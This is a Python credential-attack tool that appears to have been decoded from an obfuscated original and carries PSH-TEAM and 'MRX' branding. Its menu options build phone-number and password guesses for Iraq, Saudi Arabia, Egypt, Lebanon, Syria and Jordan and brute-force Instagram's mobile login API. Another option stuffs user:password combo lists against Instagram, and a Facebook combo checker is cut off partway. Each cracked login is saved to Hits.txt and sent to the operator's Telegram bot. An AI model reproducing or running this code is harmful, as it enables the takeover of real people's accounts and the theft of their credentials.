# encoding: utf-8
# Decoded by HackerModePro tool...
# Copyright: PSH-TEAM
# Follow us on telegram ( @psh_team )
import webbrowser
import os
try:
    import requests
except ImportError:
    os.system('pip install requests')
    import requests
    clear()

try:
    import requests
except ImportError:
    os.system('pip install clear')
    import requests
    clear()
try:
    import requests
except ImportError:
    os.system('pip install requests')
    import requests
    clear()
try:
    from colored import fg
except ImportError:
    os.system('pip install colored')
    from colored import fg
    clear()
try:
    from uuid import uuid4
except ImportError:
    os.system('pip install uuid')
    from uuid import uuid4
    clear()
try:
    import random
except ImportError:
    os.system('pip install random')
    import random
    clear()
color3 = fg(2)
color4 = fg('9')    
B ='\033[1;92m'
banner = """\033[1;32m
   

███╗   ███╗██████╗ ██╗  ██╗
████╗ ████║██╔══██╗╚██╗██╔╝
██╔████╔██║██████╔╝ ╚███╔╝ 
██║╚██╔╝██║██╔══██╗ ██╔██╗ 
██║ ╚═╝ ██║██║  ██║██╔╝ ██╗
╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝
                           


"""
print(banner)
def close():
    input('- Press Enter To Exit /')
    sys.exit()
h , b,s,block = 0,0,0,0
tele = 'y' or 'Y'
if "Y" in tele:
    id = input("\033[1;31m[+] Id Telegram : ")
    print('')
    bot = input("[+] Token Bot : ")
elif "y" in tele:
    id = input("[+] Id tlegram : ")
    print('')
    bot = input("[+] Token Bot  : ")
    print()
    print('= = = = = = = = = = = ')
    
    kl = input("""\033[1;36m
    dv:i4m_mrx
[1] IRAQ  🇮🇶

[2] KSA  🇸🇦 

[3] EGYPT 🇪🇬

[4] LEBANON 🇱🇧  

[5] SIRYA 🇸🇾

[6] JORDAN 🇯🇴

[7] CHANAL 💻📱

[8] IRAQ2  🇮🇶

[9] COMBO CHECKER 📁📅

[10] FACBOOK 📘✉️

[+] Halbzhera  » """)
print()
print('===============================')
print('')
ask = 'y' or 'Y'
print('')
#-------------------------------------------------------
if kl == "1":               
    make = '0123456789'
    print('')
    print(f"\r                           \n [=] Hit : {h} \n [=] Bad : {b} \n [=] Scure : {s} \n [=] Block : {block}",end='')

    while True:
        us = str(''.join((random.choice(make) for i in range(7))))
        user = '+964750' + us
        pasw = '0750' + us
        #print(f"\n{user} \n {pasw}")
        req = requests.session()
        log_head = {
        'User-Agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',
        'Accept': "*/*",
        'Cookie': 'missing',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'en-US',
        'X-IG-Capabilities': '3brTvw==',
        'X-IG-Connection-Type': 'WIFI',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Host': 'i.instagram.com'}
        uid = str(uuid4())
        log_data = {
            'uuid': uid,
            'password': pasw,
            'username': user,
            'device_id': uid,
            'from_reg': 'false',
            '_csrftoken': 'missing',
            'login_attempt_countn': '0'}
        r = req.post('https://i.instagram.com/api/v1/accounts/login/', headers=log_head, data=log_data, allow_redirects=True)
        #print(r.text)
        if "logged_in_user" in r.text:
            if "Y" or "y" in tele:
                t = requests.post(f"https://api.telegram.org/bot{bot}/sendMessage?chat_id={id}&text= \n\n[=] 𝐔𝐒𝐄𝐑 » {user} \n[=] 𝐏𝐀𝐒𝐒 » {pasw} \n\n ")
            open("Hits.txt","a").write(f"{user}:{pasw}\n") 
            h += 1
            os.system('cls' if os.name == 'nt' else 'clear')
            print(f"{banner}\n [=] Hit : {h} \n [=] Bad : {b} \n [=] Scure : {s} \n [=] Block : {block}",end='')
        elif 'check your username' or 'The password you entered is incorrect.' or "unusable_password" in log.text:
            b += 1
            os.system('cls' if os.name == 'nt' else 'clear')
            print(f"{banner}\r                 \n [=] Hit : {h} \n [=] Bad : {b} \n [=] Scure : {s} \n [=] Block : {block}",end='')
        elif 'check your username' or 'The password you entered is incorrect.' or "unusable_password" in log.text:
            b += 1
            os.system('cls' if os.name == 'nt' else 'clear')
            print(f"{banner}\r                          \n [=] Hit : {h} \n [=] Bad : {b} \n [=] Scure : {s} \n [=] Block : {block}",end='')
        elif 'challenge_required' or 'two' in log.text:
            s += 1
            os.system('cls' if os.name == 'nt' else 'clear')
            print(f"{banner}\r                           \n [=] Hit : {h} \n [=] Bad : {b} \n [=] Scure : {s} \n [=] Block : {block}",end='')
        elif 'Please wait a few minutes' in log.text:
            block += 1
            os.system('cls' if os.name == 'nt' else 'clear')
            print(f"{banner}\r                           \n [=] Hit : {h} \n [=] Bad : {b} \n [=] Scure : {s} \n [=] Block : {block}",end='')
        elif 'Bad request' in log.text:
            b += 1
            os.system('cls' if os.name == 'nt' else 'clear')
            print(f"{banner}\r                           \n [=] Hit : {h} \n [=] Bad : {b} \n [=] Scure : {s} \n [=] Block : {block}",end='')
        else:
            b+=1
            os.system('cls' if os.name == 'nt' else 'clear')    
            print(f"{banner}\r                           \n [=] Hit : {h} \n [=] Bad : {b} \n [=] Scure : {s} \n _[=] Block : {block}",end='')
            
   
    make = '0123456789'
    print("")
    print(f"\r                  [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}",end='')
    
#-------------------------------------

if kl == "2":               
    make = '0123456789'
    print('')
    print(f"\r                           \n [=] Hit : {h} \n [=] Bad : {b} \n [=] Scure : {s} \n [=] Block : {block}",end='')

    while True:
        us = str(''.join((random.choice(make) for i in range(7))))
        user = '+96650' + us
        pasw = '50' + us
        #print(f"\n{user} \n {pasw}")
        req = requests.session()
        log_head = {
        'User-Agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',
        'Accept': "*/*",
        'Cookie': 'missing',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'en-US',
        'X-IG-Capabilities': '3brTvw==',
        'X-IG-Connection-Type': 'WIFI',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Host': 'i.instagram.com'}
        uid = str(uuid4())
        log_data = {
            'uuid': uid,
            'password': pasw,
            'username': user,
            'device_id': uid,
            'from_reg': 'false',
            '_csrftoken': 'missing',
            'login_attempt_countn': '0'}
        r = req.post('https://i.instagram.com/api/v1/accounts/login/', headers=log_head, data=log_data, allow_redirects=True)
        #print(r.text)
        if "logged_in_user" in r.text:
            if "Y" or "y" in tele:
                t = requests.post(f"https://api.telegram.org/bot{bot}/sendMessage?chat_id={id}&text=\n\n[=] 𝐔𝐒𝐄𝐑 » {user} \n[=] 𝐏𝐀𝐒𝐒 » {pasw} \n\n ")
            open("Hits.txt","a").write(f"{user}:{pasw}\n") 
            h += 1
            os.system('cls' if os.name == 'nt' else 'clear')
            print(f"{banner}\n [=] Hit : {h} \n [=] Bad : {b} \n [=] Scure : {s} \n [=] Block : {block}",end='')
        elif 'check your username' or 'The password you entered is incorrect.' or "unusable_password" in log.text:
            b += 1
            os.system('cls' if os.name == 'nt' else 'clear')
            print(f"{banner}\r                 \n [=] Hit : {h} \n [=] Bad : {b} \n [=] Scure : {s} \n [=] Block : {block}",end='')
        elif 'check your username' or 'The password you entered is incorrect.' or "unusable_password" in log.text:
            b += 1
            os.system('cls' if os.name == 'nt' else 'clear')
            print(f"{banner}\r                          \n [=] Hit : {h} \n [=] Bad : {b} \n [=] Scure : {s} \n [=] Block : {block}",end='')
        elif 'challenge_required' or 'two' in log.text:
            s += 1
            os.system('cls' if os.name == 'nt' else 'clear')
            print(f"{banner}\r                           \n [=] Hit : {h} \n [=] Bad : {b} \n [=] Scure : {s} \n [=] Block : {block}",end='')
        elif 'Please wait a few minutes' in log.text:
            block += 1
            os.system('cls' if os.name == 'nt' else 'clear')
            print(f"{banner}\r                           \n [=] Hit : {h} \n [=] Bad : {b} \n [=] Scure : {s} \n [=] Block : {block}",end='')
        elif 'Bad request' in log.text:
            b += 1
            os.system('cls' if os.name == 'nt' else 'clear')
            print(f"{banner}\r                           \n [=] Hit : {h} \n [=] Bad : {b} \n [=] Scure : {s} \n [=] Block : {block}",end='')
        else:
            b+=1
            os.system('cls' if os.name == 'nt' else 'clear')    
            print(f"{banner}\r                           \n [=] Hit : {h} \n [=] Bad : {b} \n [=] Scure : {s} \n _[=] Block : {block}",end='')
            
   
    make = '0123456789'
    print("")
    print(f"\r                  [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}",end='')

#-------------------------------------
if kl == "3":               
    make = '0123456789'
    print('')
    print(f"\r                           \n [=] Hit : {h} \n [=] Bad : {b} \n [=] Scure : {s} \n [=] Block : {block}",end='')

    while True:
        us = str(''.join((random.choice(make) for i in range(8))))
        user = '+2010' + us
        pasw = '10' + us
        #print(f"\n{user} \n {pasw}")
        req = requests.session()
        log_head = {
        'User-Agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',
        'Accept': "*/*",
        'Cookie': 'missing',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'en-US',
        'X-IG-Capabilities': '3brTvw==',
        'X-IG-Connection-Type': 'WIFI',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Host': 'i.instagram.com'}
        uid = str(uuid4())
        log_data = {
            'uuid': uid,
            'password': pasw,
            'username': user,
            'device_id': uid,
            'from_reg': 'false',
            '_csrftoken': 'missing',
            'login_attempt_countn': '0'}
        r = req.post('https://i.instagram.com/api/v1/accounts/login/', headers=log_head, data=log_data, allow_redirects=True)
        #print(r.text)
        if "logged_in_user" in r.text:
            if "Y" or "y" in tele:
                t = requests.post(f"https://api.telegram.org/bot{bot}/sendMessage?chat_id={id}&text= \n\n[=] 𝐔𝐒𝐄𝐑 » {user} \n[=] 𝐏𝐀𝐒𝐒 » {pasw} \n\n ")
            open("Hits.txt","a").write(f"{user}:{pasw}\n") 
            h += 1
            os.system('cls' if os.name == 'nt' else 'clear')
            print(f"{banner}\n [=] Hit : {h} \n [=] Bad : {b} \n [=] Scure : {s} \n [=] Block : {block}",end='')
        elif 'check your username' or 'The password you entered is incorrect.' or "unusable_password" in log.text:
            b += 1
            os.system('cls' if os.name == 'nt' else 'clear')
            print(f"{banner}\r                 \n [=] Hit : {h} \n [=] Bad : {b} \n [=] Scure : {s} \n [=] Block : {block}",end='')
        elif 'check your username' or 'The password you entered is incorrect.' or "unusable_password" in log.text:
            b += 1
            os.system('cls' if os.name == 'nt' else 'clear')
            print(f"{banner}\r                          \n [=] Hit : {h} \n [=] Bad : {b} \n [=] Scure : {s} \n [=] Block : {block}",end='')
        elif 'challenge_required' or 'two' in log.text:
            s += 1
            os.system('cls' if os.name == 'nt' else 'clear')
            print(f"{banner}\r                           \n [=] Hit : {h} \n [=] Bad : {b} \n [=] Scure : {s} \n [=] Block : {block}",end='')
        elif 'Please wait a few minutes' in log.text:
            block += 1
            os.system('cls' if os.name == 'nt' else 'clear')
            print(f"{banner}\r                           \n [=] Hit : {h} \n [=] Bad : {b} \n [=] Scure : {s} \n [=] Block : {block}",end='')
        elif 'Bad request' in log.text:
            b += 1
            os.system('cls' if os.name == 'nt' else 'clear')
            print(f"{banner}\r                           \n [=] Hit : {h} \n [=] Bad : {b} \n [=] Scure : {s} \n [=] Block : {block}",end='')
        else:
            b+=1
            os.system('cls' if os.name == 'nt' else 'clear')    
            print(f"{banner}\r                           \n [=] Hit : {h} \n [=] Bad : {b} \n [=] Scure : {s} \n _[=] Block : {block}",end='')
            
   
    make = '0123456789'
    print("")
    print(f"\r                  [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}",end='')


if kl == "4":               
    make = '0123456789'
    print('')
    print(f"\r                           \n [=] Hit : {h} \n [=] Bad : {b} \n [=] Scure : {s} \n [=] Block : {block}",end='')

    while True:
        us = str(''.join((random.choice(make) for i in range(6))))
        user = '+96176' + us
        pasw = '76' + us
        #print(f"\n{user} \n {pasw}")
        req = requests.session()
        log_head = {
        'User-Agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',
        'Accept': "*/*",
        'Cookie': 'missing',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'en-US',
        'X-IG-Capabilities': '3brTvw==',
        'X-IG-Connection-Type': 'WIFI',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Host': 'i.instagram.com'}
        uid = str(uuid4())
        log_data = {
            'uuid': uid,
            'password': pasw,
            'username': user,
            'device_id': uid,
            'from_reg': 'false',
            '_csrftoken': 'missing',
            'login_attempt_countn': '0'}
        r = req.post('https://i.instagram.com/api/v1/accounts/login/', headers=log_head, data=log_data, allow_redirects=True)
        #print(r.text)
        if "logged_in_user" in r.text:
            if "Y" or "y" in tele:
                t = requests.post(f"https://api.telegram.org/bot{bot}/sendMessage?chat_id={id}&text\n\n[=] 𝐔𝐒𝐄𝐑 » {user} \n[=] 𝐏𝐀𝐒𝐒 » {pasw} \n\n ")
            open("Hits.txt","a").write(f"{user}:{pasw}\n") 
            h += 1
            os.system('cls' if os.name == 'nt' else 'clear')
            print(f"{banner}\n [=] Hit : {h} \n [=] Bad : {b} \n [=] Scure : {s} \n [=] Block : {block}",end='')
        elif 'check your username' or 'The password you entered is incorrect.' or "unusable_password" in log.text:
            b += 1
            os.system('cls' if os.name == 'nt' else 'clear')
            print(f"{banner}\r                 \n [=] Hit : {h} \n [=] Bad : {b} \n [=] Scure : {s} \n [=] Block : {block}",end='')
        elif 'check your username' or 'The password you entered is incorrect.' or "unusable_password" in log.text:
            b += 1
            os.system('cls' if os.name == 'nt' else 'clear')
            print(f"{banner}\r                          \n [=] Hit : {h} \n [=] Bad : {b} \n [=] Scure : {s} \n [=] Block : {block}",end='')
        elif 'challenge_required' or 'two' in log.text:
            s += 1
            os.system('cls' if os.name == 'nt' else 'clear')
            print(f"{banner}\r                           \n [=] Hit : {h} \n [=] Bad : {b} \n [=] Scure : {s} \n [=] Block : {block}",end='')
        elif 'Please wait a few minutes' in log.text:
            block += 1
            os.system('cls' if os.name == 'nt' else 'clear')
            print(f"{banner}\r                           \n [=] Hit : {h} \n [=] Bad : {b} \n [=] Scure : {s} \n [=] Block : {block}",end='')
        elif 'Bad request' in log.text:
            b += 1
            os.system('cls' if os.name == 'nt' else 'clear')
            print(f"{banner}\r                           \n [=] Hit : {h} \n [=] Bad : {b} \n [=] Scure : {s} \n [=] Block : {block}",end='')
        else:
            b+=1
            os.system('cls' if os.name == 'nt' else 'clear')    
            print(f"{banner}\r                           \n [=] Hit : {h} \n [=] Bad : {b} \n [=] Scure : {s} \n _[=] Block : {block}",end='')
            
   
    make = '0123456789'
    print("")
    print(f"\r                  [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}",end='')
    
#______________________________________________
if kl == "5":
    make = '0123456789'
    print('')
    print(f"\r                           \n [=] Hit : {h} \n [=] Bad : {b} \n [=] Scure : {s} \n [=] Block : {block}",end='')

    while True:
        us = str(''.join((random.choice(make) for i in range(8))))
        user = '+9639' + us
        pasw = '9' + us
        #print(f"\n{user} \n {pasw}")
        req = requests.session()
        log_head = {
        'User-Agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',
        'Accept': "*/*",
        'Cookie': 'missing',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'en-US',
        'X-IG-Capabilities': '3brTvw==',
        'X-IG-Connection-Type': 'WIFI',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Host': 'i.instagram.com'}
        uid = str(uuid4())
        log_data = {
            'uuid': uid,
            'password': pasw,
            'username': user,
            'device_id': uid,
            'from_reg': 'false',
            '_csrftoken': 'missing',
            'login_attempt_countn': '0'}
        r = req.post('https://i.instagram.com/api/v1/accounts/login/', headers=log_head, data=log_data, allow_redirects=True)
        #print(r.text)
        if "logged_in_user" in r.text:
            if "Y" or "y" in tele:
                t = requests.post(f"https://api.telegram.org/bot{bot}/sendMessage?chat_id={id}&text= \n\n[=] 𝐔𝐒𝐄𝐑 » {user} \n[=] 𝐏𝐀𝐒𝐒 » {pasw} \n\n ")
            open("Hits.txt","a").write(f"{user}:{pasw}\n") 
            h += 1
            os.system('cls' if os.name == 'nt' else 'clear')
            print(f"{banner}\n [=] Hit : {h} \n [=] Bad : {b} \n [=] Scure : {s} \n [=] Block : {block}",end='')
        elif 'check your username' or 'The password you entered is incorrect.' or "unusable_password" in log.text:
            b += 1
            os.system('cls' if os.name == 'nt' else 'clear')
            print(f"{banner}\r                 \n [=] Hit : {h} \n [=] Bad : {b} \n [=] Scure : {s} \n [=] Block : {block}",end='')
        elif 'check your username' or 'The password you entered is incorrect.' or "unusable_password" in log.text:
            b += 1
            os.system('cls' if os.name == 'nt' else 'clear')
            print(f"{banner}\r                          \n [=] Hit : {h} \n [=] Bad : {b} \n [=] Scure : {s} \n [=] Block : {block}",end='')
        elif 'challenge_required' or 'two' in log.text:
            s += 1
            os.system('cls' if os.name == 'nt' else 'clear')
            print(f"{banner}\r                           \n [=] Hit : {h} \n [=] Bad : {b} \n [=] Scure : {s} \n [=] Block : {block}",end='')
        elif 'Please wait a few minutes' in log.text:
            block += 1
            os.system('cls' if os.name == 'nt' else 'clear')
            print(f"{banner}\r                           \n [=] Hit : {h} \n [=] Bad : {b} \n [=] Scure : {s} \n [=] Block : {block}",end='')
        elif 'Bad request' in log.text:
            b += 1
            os.system('cls' if os.name == 'nt' else 'clear')
            print(f"{banner}\r                           \n [=] Hit : {h} \n [=] Bad : {b} \n [=] Scure : {s} \n [=] Block : {block}",end='')
        else:
            b+=1
            os.system('cls' if os.name == 'nt' else 'clear')    
            print(f"{banner}\r                           \n [=] Hit : {h} \n [=] Bad : {b} \n [=] Scure : {s} \n _[=] Block : {block}",end='')
            
   
    make = '0123456789'
    print("")
    print(f"\r                  [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}",end='')


if kl == "6":               
    make = '0123456789'
    print('')
    print(f"\r                           \n [=] Hit : {h} \n [=] Bad : {b} \n [=] Scure : {s} \n [=] Block : {block}",end='')

    while True:
        us = str(''.join((random.choice(make) for i in range(7))))
        user = '+96277' + us
        pasw = '77' + us
        #print(f"\n{user} \n {pasw}")
        req = requests.session()
        log_head = {
        'User-Agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',
        'Accept': "*/*",
        'Cookie': 'missing',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'en-US',
        'X-IG-Capabilities': '3brTvw==',
        'X-IG-Connection-Type': 'WIFI',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Host': 'i.instagram.com'}
        uid = str(uuid4())
        log_data = {
            'uuid': uid,
            'password': pasw,
            'username': user,
            'device_id': uid,
            'from_reg': 'false',
            '_csrftoken': 'missing',
            'login_attempt_countn': '0'}
        r = req.post('https://i.instagram.com/api/v1/accounts/login/', headers=log_head, data=log_data, allow_redirects=True)
        #print(r.text)
        if "logged_in_user" in r.text:
            if "Y" or "y" in tele:
                t = requests.post(f"https://api.telegram.org/bot{bot}/sendMessage?chat_id={id}&text=𝑯𝑬𝑳𝑳𝑶 𝑵𝑬𝑾 𝑨𝑪𝑪𝑶𝑼𝑵𝑻 𝑰𝑵𝑺𝑻𝑨𝑮𝑹𝑨𝑴 \n\n[=] 𝐔𝐒𝐄𝐑 » {user} \n[=] 𝐏𝐀𝐒𝐒 » {pasw} \n\n ")
            open("Hits.txt","a").write(f"{user}:{pasw}\n") 
            h += 1
            os.system('cls' if os.name == 'nt' else 'clear')
            print(f"{banner}\n [=] Hit : {h} \n [=] Bad : {b} \n [=] Scure : {s} \n [=] Block : {block}",end='')
        elif 'check your username' or 'The password you entered is incorrect.' or "unusable_password" in log.text:
            b += 1
            os.system('cls' if os.name == 'nt' else 'clear')
            print(f"{banner}\r                 \n [=] Hit : {h} \n [=] Bad : {b} \n [=] Scure : {s} \n [=] Block : {block}",end='')
        elif 'check your username' or 'The password you entered is incorrect.' or "unusable_password" in log.text:
            b += 1
            os.system('cls' if os.name == 'nt' else 'clear')
            print(f"{banner}\r                          \n [=] Hit : {h} \n [=] Bad : {b} \n [=] Scure : {s} \n [=] Block : {block}",end='')
        elif 'challenge_required' or 'two' in log.text:
            s += 1
            os.system('cls' if os.name == 'nt' else 'clear')
            print(f"{banner}\r                           \n [=] Hit : {h} \n [=] Bad : {b} \n [=] Scure : {s} \n [=] Block : {block}",end='')
        elif 'Please wait a few minutes' in log.text:
            block += 1
            os.system('cls' if os.name == 'nt' else 'clear')
            print(f"{banner}\r                           \n [=] Hit : {h} \n [=] Bad : {b} \n [=] Scure : {s} \n [=] Block : {block}",end='')
        elif 'Bad request' in log.text:
            b += 1
            os.system('cls' if os.name == 'nt' else 'clear')
            print(f"{banner}\r                           \n [=] Hit : {h} \n [=] Bad : {b} \n [=] Scure : {s} \n [=] Block : {block}",end='')
        else:
            b+=1
            os.system('cls' if os.name == 'nt' else 'clear')    
            print(f"{banner}\r                           \n [=] Hit : {h} \n [=] Bad : {b} \n [=] Scure : {s} \n _[=] Block : {block}",end='')
            
   
    make = '0123456789'
    print("")
    print(f"\r                  [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}",end='')
    
if kl == "7":               
	os.system('xdg-open https://t.me/python968')
if kl == "8":               
    make = '0123456789'
    print('')
    print(f"\r                           \n [=] Hit : {h} \n [=] Bad : {b} \n [=] Scure : {s} \n [=] Block : {block}",end='')

    while True:
        us = str(''.join((random.choice(make) for i in range(7))))
        user = '+964' + us
        pasw = '770' + us
        #print(f"\n{user} \n {pasw}")
        req = requests.session()
        log_head = {
        'User-Agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',
        'Accept': "*/*",
        'Cookie': 'missing',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'en-US',
        'X-IG-Capabilities': '3brTvw==',
        'X-IG-Connection-Type': 'WIFI',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Host': 'i.instagram.com'}
        uid = str(uuid4())
        log_data = {
            'uuid': uid,
            'password': pasw,
            'username': user,
            'device_id': uid,
            'from_reg': 'false',
            '_csrftoken': 'missing',
            'login_attempt_countn': '0'}
        r = req.post('https://i.instagram.com/api/v1/accounts/login/', headers=log_head, data=log_data, allow_redirects=True)
        #print(r.text)
        if "logged_in_user" in r.text:
            if "Y" or "y" in tele:
                t = requests.post(f"https://api.telegram.org/bot{bot}/sendMessage?chat_id={id}&text=𝑯𝑬𝑳𝑳𝑶 𝑵𝑬𝑾 𝑨𝑪𝑪𝑶𝑼𝑵𝑻 𝑰𝑵𝑺𝑻𝑨𝑮𝑹𝑨𝑴 \n\n[=] 𝐔𝐒𝐄𝐑 » {user} \n[=] 𝐏𝐀𝐒𝐒 » {pasw} \n\n ")
            open("Hits.txt","a").write(f"{user}:{pasw}\n") 
            h += 1
            os.system('cls' if os.name == 'nt' else 'clear')
            print(f"{banner}\n [=] Hit : {h} \n [=] Bad : {b} \n [=] Scure : {s} \n [=] Block : {block}",end='')
        elif 'check your username' or 'The password you entered is incorrect.' or "unusable_password" in log.text:
            b += 1
            os.system('cls' if os.name == 'nt' else 'clear')
            print(f"{banner}\r                 \n [=] Hit : {h} \n [=] Bad : {b} \n [=] Scure : {s} \n [=] Block : {block}",end='')
        elif 'check your username' or 'The password you entered is incorrect.' or "unusable_password" in log.text:
            b += 1
            os.system('cls' if os.name == 'nt' else 'clear')
            print(f"{banner}\r                          \n [=] Hit : {h} \n [=] Bad : {b} \n [=] Scure : {s} \n [=] Block : {block}",end='')
        elif 'challenge_required' or 'two' in log.text:
            s += 1
            os.system('cls' if os.name == 'nt' else 'clear')
            print(f"{banner}\r                           \n [=] Hit : {h} \n [=] Bad : {b} \n [=] Scure : {s} \n [=] Block : {block}",end='')
        elif 'Please wait a few minutes' in log.text:
            block += 1
            os.system('cls' if os.name == 'nt' else 'clear')
            print(f"{banner}\r                           \n [=] Hit : {h} \n [=] Bad : {b} \n [=] Scure : {s} \n [=] Block : {block}",end='')
        elif 'Bad request' in log.text:
            b += 1
            os.system('cls' if os.name == 'nt' else 'clear')
            print(f"{banner}\r                           \n [=] Hit : {h} \n [=] Bad : {b} \n [=] Scure : {s} \n [=] Block : {block}",end='')
        else:
            b+=1
            os.system('cls' if os.name == 'nt' else 'clear')    
            print(f"{banner}\r                           \n [=] Hit : {h} \n [=] Bad : {b} \n [=] Scure : {s} \n _[=] Block : {block}",end='')
            
   
    make = '0123456789'
    print("")
    print(f"\r                  [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}",end='')
    
    
if kl == "9":               
    os.system('clear')
    print(banner)
    co = input("\033[1;91mCOMBO: ")
    if '.txt' in co:
        pass
    else:
        co  = co + '.txt'
   
    os.system('clear')
    print(banner)
    print(f"\r \033[32mGOOD: {h} \033[31;1mBAD: {b} \033[33;1mCHECKPOINT: {s} \033[31;1mBLOCK: {block}",end='')
    acc = open(co,"r").read().splitlines()
    for combo in acc:
        user = combo.split(":")[0]
        pasw = combo.split(":")[1]
        req = requests.session()
        log_head = {
        'User-Agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',
        'Accept': "*/*",
        'Cookie': 'missing',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'en-US',
        'X-IG-Capabilities': '3brTvw==',
        'X-IG-Connection-Type': 'WIFI',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Host': 'i.instagram.com'}
        uid = str(uuid4())
        log_data = {
            'uuid': uid,
            'password': pasw,
            'username': user,
            'device_id': uid,
            'from_reg': 'false',
            '_csrftoken': 'missing',
            'login_attempt_countn': '0'}
        r = req.post('https://i.instagram.com/api/v1/accounts/login/', headers=log_head, data=log_data, allow_redirects=True)
        #print(r.text)
        if "logged_in_user" in r.text:
            if "Y" or "y" in tele:
                  t = requests.post(f"https://api.telegram.org/bot{bot}/sendMessage?chat_id={id}&text=GOOD HACK BY MRX✅ USAR:{user}    PASS:{pasw}     Telegram : @i4m_mrx")
         
            h += 1
            print(f"\r \033[32mGOOD: {h} \033[31;1mBAD: {b} \033[33;1mCHECKPOINT: {s} \033[31;1mBLOCK: {block}",end='')
        elif 'check your username' or 'The password you entered is incorrect.' or "unusable_password" in log.text:
            b += 1
            print(f"\r \033[32mGOOD: {h} \033[31;1mBAD: {b} \033[33;1mCHECKPOINT: {s} \033[31;1mBLOCK: {block}",end='')
        elif 'challenge_required' in log.text:
            s += 1
            print(f"\r \033[32mGOOD: {h} \033[31;1mBAD: {b} \033[33;1mCHECKPOINT: {s} \033[31;1mBLOCK: {block}",end='')
        elif 'Please wait a few minutes' in log.text:
            block += 1
            print(f"\r \033[32mGOOD: {h} \033[31;1mBAD: {b} \033[33;1mCHECKPOINT: {s} \033[31;1mBLOCK: {block}",end='')
        elif 'Bad request' in log.text:
            b += 1
            print(f"\r \033[32mGOOD: {h} \033[31;1mBAD: {b} \033[33;1mCHECKPOINT: {s} \033[31;1mBLOCK: {block}",end='')
        else:
            b+=1    
            print(f"\r \033[32mGOOD: {h} \033[31;1mBAD: {b} \033[33;1mCHECKPOINT: {s} \033[31;1mBLOCK: {block}",end='')

if kl == "10":  
  os.system("clear")
  print(banner)        
  email = input('[+] List Combo : ')
  filer = open(email,"r").readlines()
   #password = input('[+] Pass : ')
  ani2 = 0
  dyar2 = 0
  for xx in filer:
	   uu = xx.strip().split(":")
	   combo1 = uu[0]
	   combo2 = uu[1]
	
  headers = {
	  "user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1",
	  "accept": "*/*",
    "accept-language": "en-US,en;q=0.9",
    "content-type": "application/x-www-form-urlencoded",
    "cookie": "sb=JxZmYETLnD983J-sdhDKxloz; datr=JxZmYO_Kkqd0uriUeBjh7xMx; m_pixel_ratio=3; wd=375x812; x-referer=eyJyIjoiLz9zb2Z0PWJvb2ttYXJrcyIsImgiOiIvP3NvZnQ9Ym9va21hcmtzIiwicyI6Im10b3VjaCJ9; locale=ar_AR; fr=18QLqPXdXjz3wttYL.AWWp9DiM08Ikxyr3lxpLWhsftBc.BgZhYn.vb.AAA.0.0.BghxhH.AWXCrio57oI",
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "same-origin",
    "x-fb-lsd": "AVoEZpcdCYo",
    "x-requested-with": "XMLHttpRequest",
    "x-response-format": "JSONStream",
    "referrer": "https://mtouch.facebook.com/login/?next&ref=dbl&fl&refid=8&paipv=0",
    "referrerPolicy": "strict-origin-when-cross-origin",
	}
  data = {
	"m_ts": "1619466306",
  "li": "QRiHYOvaTz-vUGJoT9DRid2W",
  "try_number": "0",
  "unrecognized_tries": "0",
  "email": combo1,
  "prefill_contact_point": combo1,
  "prefill_source": "browser_dropdown",
  "prefill_type": "contact_point",
  "first_prefill_source": "browser_dropdown",
  "first_prefill_type": "contact_point",
  "had_cp_prefilled": "true",
  "had_password_prefilled": "false",
  "is_smart_lock": "false",
  "bi_xrwh": "0",
